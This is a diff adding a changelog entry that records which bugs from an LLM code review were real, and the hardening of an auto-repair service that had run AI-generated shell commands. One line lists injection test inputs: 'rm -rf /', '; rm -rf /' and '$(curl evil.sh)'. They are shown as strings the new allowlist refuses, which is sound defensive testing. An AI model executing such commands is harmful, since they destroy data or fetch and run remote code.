@@ -7575,3 +7575,32 @@ call      400      :  1      ← Twilio rejected bad number format
 - ghost_scout_iproyal.py: 2 of 15 reported real (`bs4`, phone bounds); rest false-positive or over-engineering.
 - auto_blast_engine.py: 1 of 20 reported real (country "ON" false-positive); others either fictional or rejected per "minimum needed complexity" coding guideline.
 - system_uptime_router.py: 4 of 23 reported real (`_safe_count` masking, age_s negative, HTTP 200 on outage, unused `os`); rest over-engineering.
+
+---
+
+## 2026-05-14 — autonomous_stack.py + auto_repair.py Hardening
+
+**User pasted a 40+ bug LLM review across these 2 files. After verification:**
+
+**Critical FALSE POSITIVE caught & rejected (with live proof):**
+- LLM claimed `find_one(sort=[...])` "doesn't take sort param, would crash" in both files. Ran the exact call live against MongoDB → returned doc fine. Motor/PyMongo fully supports it. Not touched.
+
+**REAL bugs fixed in `autonomous_stack.py`:**
+- 24h-rollup fallback fired on legitimate 0 (waste DB call) AND collapsed double-failure into 0 (silent corruption). Now only falls back on `-1` and propagates `-1` on double failure.
+- Council join used loose regex `{"action": {"$regex": "sentinel_ai_diagnose"}}` returning ANY recent council row regardless of which error it belonged to. Now binds via `error_id` / `payload.error_id` / `source_signature` and requires `ts >= suggestion.created_at`.
+- `action_filter` not regex-escaped — admin passing `.*` widened query to ALL rows. Now `re.escape`-d.
+
+**REAL security bugs fixed in `auto_repair.py`:**
+- `process_whatsapp_approval` was piping AI-generated `fix_command` strings into `/bin/sh -c` after WhatsApp approve. Replaced with a strict regex allowlist (`supervisorctl restart|start|stop X`, `pip install pkg`, `yarn install|build`) executed as argv via `shell=False`. Tested against 11 injection variants (`rm -rf /`, `; rm -rf /`, `$(curl evil.sh)`, backticks, etc) — all refused.
+- `pip install <whatever-the-error-said>` allowed typosquat malware. Added `_PIP_INSTALL_ALLOWLIST` of 28 known-safe packages.
+- `code_patch` overwrote files with no backup and no syntax check — broken comment → backend down. Now `shutil.copy2 .bak`, `ast.parse` validation pre-write, post-write re-parse with restore on any SyntaxError.
+- Repair-storm: no cooloff → infinite restart→break→restart spirals possible. Added 3-cycles-in-5-min guard returning `{"status": "cooloff"}`.
+- Error dedup: identical error lines triggered N parallel fixes per cycle. Now MD5-hashed and dedup'd.
+- AI LLM call had no timeout → could block the 10-min scheduler. Wrapped in `asyncio.wait_for(timeout=30s)`.
+- Hardcoded admin phone `+16134000000` fallback removed; alerts now silently no-op when `ADMIN_WHATSAPP` is unset.
+- Removed unused `Optional` import.
+
+**Live proof after restart:**
+- `/api/system/uptime` returns `last_run_processed=5, last_run_sent=7, zero_sent_streak=0, leads_added=24` — campaign actively sending real leads.
+- 19 new tests in `tests/test_autonomous_stack_and_auto_repair_fixes.py`: 19/19 pass.
+- Full regression: 71/71 pass across 6 test files.
